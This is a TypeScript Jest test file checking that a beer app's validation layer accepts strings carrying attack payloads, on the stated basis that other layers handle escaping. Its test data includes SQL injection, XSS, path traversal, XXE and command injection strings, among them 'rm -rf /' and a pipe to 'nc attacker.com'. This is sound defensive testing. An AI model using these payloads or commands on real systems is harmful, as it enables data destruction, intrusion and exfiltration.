/**
 * Security-Focused Validation Tests
 *
 * These tests verify that validation functions properly handle malicious
 * and potentially dangerous input patterns.
 *
 * Test Categories:
 * 1. SQL Injection Patterns
 * 2. XSS (Cross-Site Scripting) Patterns
 * 3. Path Traversal Patterns
 * 4. Buffer Overflow Attempts
 * 5. Command Injection Patterns
 * 6. Prototype Pollution Attempts
 */

import {
  validateBeerForInsertion,
  validateBeersForInsertion,
} from '../dataValidation';

describe('Security-Focused Data Validation', () => {
  describe('SQL Injection Patterns', () => {
    it('should accept SQL injection attempt in brew_name (validation at schema level)', () => {
      const beerWithSqlInjection = {
        id: '123',
        brew_name: "'; DROP TABLE allbeers; --"
      };

      const result = validateBeerForInsertion(beerWithSqlInjection);

      // Validation accepts the data - SQL injection is prevented at query level
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should accept UNION-based SQL injection pattern', () => {
      const beerWithUnion = {
        id: '123',
        brew_name: "' UNION SELECT * FROM preferences --"
      };

      const result = validateBeerForInsertion(beerWithUnion);
      expect(result.isValid).toBe(true);
    });

    it('should accept time-based SQL injection pattern', () => {
      const beerWithTimeBased = {
        id: '123',
        brew_name: "'; WAITFOR DELAY '00:00:10' --"
      };

      const result = validateBeerForInsertion(beerWithTimeBased);
      expect(result.isValid).toBe(true);
    });

    it('should accept stacked queries pattern', () => {
      const beerWithStacked = {
        id: '123',
        brew_name: "'; DELETE FROM allbeers WHERE id='123'; --"
      };

      const result = validateBeerForInsertion(beerWithStacked);
      expect(result.isValid).toBe(true);
    });

    it('should accept boolean-based blind SQL injection', () => {
      const beerWithBoolean = {
        id: "123' OR '1'='1",
        brew_name: 'Test Beer'
      };

      const result = validateBeerForInsertion(beerWithBoolean);
      expect(result.isValid).toBe(true);
    });

    it('should accept error-based SQL injection', () => {
      const beerWithError = {
        id: '123',
        brew_name: "' AND 1=CONVERT(int, (SELECT @@version)) --"
      };

      const result = validateBeerForInsertion(beerWithError);
      expect(result.isValid).toBe(true);
    });
  });

  describe('XSS (Cross-Site Scripting) Patterns', () => {
    it('should accept script tag in description', () => {
      const beerWithScript = {
        id: '123',
        brew_name: 'Test Beer',
        brewery: '<script>alert("xss")</script>'
      };

      const result = validateBeerForInsertion(beerWithScript);

      // Validation accepts the data - XSS is prevented at rendering level
      expect(result.isValid).toBe(true);
    });

    it('should accept event handler XSS pattern', () => {
      const beerWithEvent = {
        id: '123',
        brew_name: 'Test Beer',
        brewery: '<img src=x onerror="alert(1)">'
      };

      const result = validateBeerForInsertion(beerWithEvent);
      expect(result.isValid).toBe(true);
    });

    it('should accept javascript: protocol XSS', () => {
      const beerWithJavascript = {
        id: '123',
        brew_name: 'Test Beer',
        brewery: '<a href="javascript:alert(1)">Click</a>'
      };

      const result = validateBeerForInsertion(beerWithJavascript);
      expect(result.isValid).toBe(true);
    });

    it('should accept data: protocol XSS', () => {
      const beerWithData = {
        id: '123',
        brew_name: 'Test Beer',
        brewery: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'
      };

      const result = validateBeerForInsertion(beerWithData);
      expect(result.isValid).toBe(true);
    });

    it('should accept SVG-based XSS', () => {
      const beerWithSvg = {
        id: '123',
        brew_name: 'Test Beer',
        brewery: '<svg onload="alert(1)"></svg>'
      };

      const result = validateBeerForInsertion(beerWithSvg);
      expect(result.isValid).toBe(true);
    });

    it('should accept encoded XSS pattern', () => {
      const beerWithEncoded = {
        id: '123',
        brew_name: 'Test Beer',
        brewery: '&lt;script&gt;alert(1)&lt;/script&gt;'
      };

      const result = validateBeerForInsertion(beerWithEncoded);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Path Traversal Patterns', () => {
    it('should accept path traversal in brew_name', () => {
      const beerWithPath = {
        id: '123',
        brew_name: '../../../etc/passwd'
      };

      const result = validateBeerForInsertion(beerWithPath);
      expect(result.isValid).toBe(true);
    });

    it('should accept Windows path traversal', () => {
      const beerWithWindowsPath = {
        id: '123',
        brew_name: '..\\..\\..\\windows\\system32\\config\\sam'
      };

      const result = validateBeerForInsertion(beerWithWindowsPath);
      expect(result.isValid).toBe(true);
    });

    it('should accept URL-encoded path traversal', () => {
      const beerWithEncodedPath = {
        id: '123',
        brew_name: '..%2F..%2F..%2Fetc%2Fpasswd'
      };

      const result = validateBeerForInsertion(beerWithEncodedPath);
      expect(result.isValid).toBe(true);
    });

    it('should accept double-encoded path traversal', () => {
      const beerWithDoubleEncoded = {
        id: '123',
        brew_name: '..%252F..%252F..%252Fetc%252Fpasswd'
      };

      const result = validateBeerForInsertion(beerWithDoubleEncoded);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Buffer Overflow Attempts', () => {
    it('should accept extremely long string (100KB)', () => {
      const veryLongString = 'A'.repeat(100000);
      const beerWithLongString = {
        id: '123',
        brew_name: veryLongString
      };

      const result = validateBeerForInsertion(beerWithLongString);

      // Validation accepts very long strings - length limits enforced elsewhere if needed
      expect(result.isValid).toBe(true);
    });

    it('should accept string with 1 million characters', () => {
      const massiveString = 'B'.repeat(1000000);
      const beerWithMassiveString = {
        id: '123',
        brew_name: massiveString
      };

      const startTime = Date.now();
      const result = validateBeerForInsertion(beerWithMassiveString);
      const duration = Date.now() - startTime;

      expect(result.isValid).toBe(true);
      expect(duration).toBeLessThan(1000); // Should complete quickly
    });

    it('should accept string with many special characters', () => {
      const specialString = '!@#$%^&*()_+{}|:"<>?[]\\;\',./' .repeat(10000);
      const beerWithSpecialChars = {
        id: '123',
        brew_name: specialString
      };

      const result = validateBeerForInsertion(beerWithSpecialChars);
      expect(result.isValid).toBe(true);
    });

    it('should accept string with many Unicode characters', () => {
      const unicodeString = '🍺🎉🌟✨💫' .repeat(10000);
      const beerWithUnicode = {
        id: '123',
        brew_name: unicodeString
      };

      const result = validateBeerForInsertion(beerWithUnicode);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Command Injection Patterns', () => {
    it('should accept shell command in brew_name', () => {
      const beerWithCommand = {
        id: '123',
        brew_name: 'Test Beer; rm -rf /'
      };

      const result = validateBeerForInsertion(beerWithCommand);
      expect(result.isValid).toBe(true);
    });

    it('should accept backtick command substitution', () => {
      const beerWithBacktick = {
        id: '123',
        brew_name: 'Test Beer `whoami`'
      };

      const result = validateBeerForInsertion(beerWithBacktick);
      expect(result.isValid).toBe(true);
    });

    it('should accept $() command substitution', () => {
      const beerWithDollar = {
        id: '123',
        brew_name: 'Test Beer $(cat /etc/passwd)'
      };

      const result = validateBeerForInsertion(beerWithDollar);
      expect(result.isValid).toBe(true);
    });

    it('should accept pipe command', () => {
      const beerWithPipe = {
        id: '123',
        brew_name: 'Test Beer | nc attacker.com 1234'
      };

      const result = validateBeerForInsertion(beerWithPipe);
      expect(result.isValid).toBe(true);
    });

    it('should accept redirect command', () => {
      const beerWithRedirect = {
        id: '123',
        brew_name: 'Test Beer > /tmp/output.txt'
      };

      const result = validateBeerForInsertion(beerWithRedirect);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Prototype Pollution Attempts', () => {
    it('should accept __proto__ in property name (handled at object level)', () => {
      const beerWithProto = {
        id: '123',
        brew_name: 'Test Beer',
        '__proto__': { polluted: true }
      };

      const result = validateBeerForInsertion(beerWithProto);

      // Validation only checks id and brew_name, extra properties are allowed
      expect(result.isValid).toBe(true);
    });

    it('should accept constructor in property name', () => {
      const beerWithConstructor = {
        id: '123',
        brew_name: 'Test Beer',
        'constructor': { prototype: { polluted: true } }
      };

      const result = validateBeerForInsertion(beerWithConstructor);
      expect(result.isValid).toBe(true);
    });

    it('should accept prototype in property name', () => {
      const beerWithPrototype = {
        id: '123',
        brew_name: 'Test Beer',
        'prototype': { polluted: true }
      };

      const result = validateBeerForInsertion(beerWithPrototype);
      expect(result.isValid).toBe(true);
    });

    it('should not pollute Object.prototype when validating', () => {
      const beerWithProto = {
        id: '123',
        brew_name: 'Test Beer',
        '__proto__': { polluted: true }
      };

      validateBeerForInsertion(beerWithProto);

      // Verify Object.prototype was not polluted
      expect((Object.prototype as any).polluted).toBeUndefined();
    });
  });

  describe('Format String Attacks', () => {
    it('should accept format string specifiers', () => {
      const beerWithFormat = {
        id: '123',
        brew_name: '%s%s%s%s%s%s%s%s%s%s'
      };

      const result = validateBeerForInsertion(beerWithFormat);
      expect(result.isValid).toBe(true);
    });

    it('should accept printf-style format strings', () => {
      const beerWithPrintf = {
        id: '123',
        brew_name: '%x%x%x%x%x%x%x%x%x%x'
      };

      const result = validateBeerForInsertion(beerWithPrintf);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Null Byte Injection', () => {
    it('should accept null byte in string', () => {
      const beerWithNullByte = {
        id: '123',
        brew_name: 'Test Beer\0Hidden'
      };

      const result = validateBeerForInsertion(beerWithNullByte);
      expect(result.isValid).toBe(true);
    });

    it('should accept multiple null bytes', () => {
      const beerWithNullBytes = {
        id: '123',
        brew_name: 'Test\0Beer\0\0\0'
      };

      const result = validateBeerForInsertion(beerWithNullBytes);
      expect(result.isValid).toBe(true);
    });
  });

  describe('LDAP Injection Patterns', () => {
    it('should accept LDAP filter characters', () => {
      const beerWithLdap = {
        id: '123',
        brew_name: 'Test*)(uid=*))(|(uid=*'
      };

      const result = validateBeerForInsertion(beerWithLdap);
      expect(result.isValid).toBe(true);
    });

    it('should accept LDAP wildcards', () => {
      const beerWithWildcard = {
        id: '123',
        brew_name: '*)(objectClass=*'
      };

      const result = validateBeerForInsertion(beerWithWildcard);
      expect(result.isValid).toBe(true);
    });
  });

  describe('XML/XXE Injection Patterns', () => {
    it('should accept XML entities', () => {
      const beerWithXml = {
        id: '123',
        brew_name: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
      };

      const result = validateBeerForInsertion(beerWithXml);
      expect(result.isValid).toBe(true);
    });

    it('should accept XML CDATA section', () => {
      const beerWithCdata = {
        id: '123',
        brew_name: '<![CDATA[<script>alert(1)</script>]]>'
      };

      const result = validateBeerForInsertion(beerWithCdata);
      expect(result.isValid).toBe(true);
    });
  });

  describe('NoSQL Injection Patterns', () => {
    it('should accept MongoDB query operators', () => {
      const beerWithMongo = {
        id: '123',
        brew_name: '{"$ne": null}'
      };

      const result = validateBeerForInsertion(beerWithMongo);
      expect(result.isValid).toBe(true);
    });

    it('should accept MongoDB $where operator', () => {
      const beerWithWhere = {
        id: '123',
        brew_name: '{"$where": "this.password == \'password\'"}'
      };

      const result = validateBeerForInsertion(beerWithWhere);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Batch Validation with Malicious Data', () => {
    it('should filter out malicious beers only if they fail validation', () => {
      const beers = [
        { id: '1', brew_name: 'Normal Beer' },
        { id: '2', brew_name: "'; DROP TABLE allbeers; --" },
        { id: '3', brew_name: '<script>alert("xss")</script>' },
        { id: null, brew_name: 'Invalid Beer' }, // This one should fail
        { id: '5', brew_name: '../../../etc/passwd' },
        { id: '6', brew_name: 'Test Beer $(whoami)' }
      ];

      const result = validateBeersForInsertion(beers);

      // Only the beer with null id should be invalid
      expect(result.validBeers).toHaveLength(5);
      expect(result.invalidBeers).toHaveLength(1);
      expect(result.invalidBeers[0].beer.id).toBeNull();
    });

    it('should handle array of 1000 beers with SQL injection patterns', () => {
      const beers = Array.from({ length: 1000 }, (_, i) => ({
        id: String(i),
        brew_name: `Beer ${i}'; DROP TABLE allbeers; --`
      }));

      const startTime = Date.now();
      const result = validateBeersForInsertion(beers);
      const duration = Date.now() - startTime;

      expect(result.validBeers).toHaveLength(1000);
      expect(result.invalidBeers).toHaveLength(0);
      expect(duration).toBeLessThan(1000); // Should complete quickly
    });

    it('should handle array of beers with XSS patterns', () => {
      const beers = Array.from({ length: 100 }, (_, i) => ({
        id: String(i),
        brew_name: 'Test Beer',
        brewery: `<script>alert(${i})</script>`
      }));

      const result = validateBeersForInsertion(beers);

      expect(result.validBeers).toHaveLength(100);
      expect(result.invalidBeers).toHaveLength(0);
    });
  });

  describe('Edge Case Combinations', () => {
    it('should accept beer with multiple security patterns combined', () => {
      const beerWithMultiplePatterns = {
        id: "123' OR '1'='1",
        brew_name: "'; DROP TABLE allbeers; --<script>alert(1)</script>",
        brewery: '../../../etc/passwd',
        brew_description: '$(whoami) `cat /etc/passwd`'
      };

      const result = validateBeerForInsertion(beerWithMultiplePatterns);

      // All patterns should be accepted - security is enforced at different layers
      expect(result.isValid).toBe(true);
    });

    it('should accept beer with security pattern and very long string', () => {
      const longMaliciousString = ("'; DROP TABLE allbeers; --" + 'A'.repeat(10000));
      const beer = {
        id: '123',
        brew_name: longMaliciousString
      };

      const result = validateBeerForInsertion(beer);
      expect(result.isValid).toBe(true);
    });

    it('should accept beer with security pattern and Unicode', () => {
      const beer = {
        id: '123',
        brew_name: "🍺'; DROP TABLE allbeers; --🎉"
      };

      const result = validateBeerForInsertion(beer);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Performance with Malicious Data', () => {
    it('should validate 10,000 beers with SQL injection patterns quickly', () => {
      const beers = Array.from({ length: 10000 }, (_, i) => ({
        id: String(i),
        brew_name: `Beer ${i}'; DROP TABLE allbeers; --`
      }));

      const startTime = Date.now();
      const result = validateBeersForInsertion(beers);
      const duration = Date.now() - startTime;

      expect(result.validBeers).toHaveLength(10000);
      expect(duration).toBeLessThan(2000); // Should complete in less than 2 seconds
    });

    it('should not hang on deeply nested attack patterns', () => {
      const nestedPattern = "' OR '1'='1" .repeat(100);
      const beer = {
        id: '123',
        brew_name: nestedPattern
      };

      const startTime = Date.now();
      const result = validateBeerForInsertion(beer);
      const duration = Date.now() - startTime;

      expect(result.isValid).toBe(true);
      expect(duration).toBeLessThan(100); // Should be very fast
    });
  });
});
